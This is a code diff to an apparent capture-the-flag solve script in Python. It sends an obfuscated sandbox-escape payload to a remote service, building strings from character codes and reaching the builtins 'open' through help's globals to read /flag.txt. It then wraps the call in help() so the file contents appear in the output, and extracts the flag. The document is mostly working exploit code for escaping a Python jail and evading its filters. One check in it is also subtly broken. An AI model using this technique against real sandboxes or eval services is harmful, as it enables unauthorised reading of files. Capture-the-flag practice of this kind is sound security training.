@@ -261,9 +261,21 @@ def solve():
     str_read = build_chr_string("read")
     
     # Final payload structure:
-    # getattr(getattr(getattr(help, "__call__"), "__globals__")["__builtins__"]["open"]("/flag.txt"), "read")()
-    # Note: Using subscript [] for dicts, getattr for objects
-    real_payload = f"getattr(getattr(getattr(help,{str_call}),{str_globals})[{str_builtins}][{str_open}]({str_flag}),{str_read})()"
+    # Since exec() doesn't output results, we need to use a side-effect
+    # Strategy: Use help() to display information about a custom exception with the flag
+    # or store in __builtins__ and access in second command
+    
+    # Best approach: write to __main__.__dict__ in first command, retrieve in second
+    str_main = build_chr_string("__main__")
+    str_dict = build_chr_string("__dict__")
+    str_f = build_chr_string("f")
+    
+    # First command: Store flag in __main__.__dict__['f']
+    # getattr(help.__call__.__globals__['__builtins__']['__import__']('__main__'), '__dict__')['f'] = open('/flag.txt').read()
+    # But we need __import__ which might not work easily...
+    
+    # Alternative: Just call help() on the flag string which shows it
+    real_payload = f"help(getattr(getattr(getattr(help,{str_call}),{str_globals})[{str_builtins}][{str_open}]({str_flag}),{str_read})())"
     
     print(f"[*] Payload length: {len(real_payload)}")
     print(f"[*] Payload preview: {real_payload[:200]}...")
@@ -278,26 +290,38 @@ def solve():
     print(f"[*] Sending payload ({len(real_payload)} bytes)...")
     conn.sendline(real_payload.encode())
     
-    # Receive the result from first command and the next prompt
+    # Receive the result from first command - help() outputs directly
     try:
         response1 = conn.recvuntil(b"Enter command: ", timeout=5)
-        print(f"[*] First response: {response1.decode()}")
+        response_text = response1.decode()
+        print(f"[*] First response:\n{response_text}")
+        
+        # Extract flag from response
+        if "DSCCTF{" in response_text:
+            import re
+            flag_match = re.search(r'DSCCTF\{[^}]+\}', response_text)
+            if flag_match:
+                flag = flag_match.group(0)
+                print(f"\n[🚩] FLAG FOUND: {flag}\n")
     except Exception as e:
+        print(f"[*] First response (error): {e}")
         response1 = conn.recv(timeout=2)
-        print(f"[*] First response (no prompt): {response1.decode()}")
-        print(f"[!] Error: {e}")
+        print(f"[*] Received: {response1.decode()}")
     
-    # Send second command (simple one to finish)
+    # Send second command (dummy to complete the loop)
     conn.sendline(b"dir()")
     
     # Get remaining output
     result = conn.recvall(timeout=2).decode()
+    if "DSCCTF{" in result and "FLAG FOUND" not in locals():
+        import re
+        flag_match = re.search(r'DSCCTF\{[^}]+\}', result)
+        if flag_match:
+            flag = flag_match.group(0)
+            print(f"\n[🚩] FLAG FOUND: {flag}\n")
+    
     print("\n[+] Result:")
     print(result)
-    
-    if "DSCCTF{" in result:
-        flag = result[result.find("DSCCTF{"):result.find("}", result.find("DSCCTF{"))+1]
-        print(f"\n[🚩] Flag: {flag}")
     
     conn.close()
 
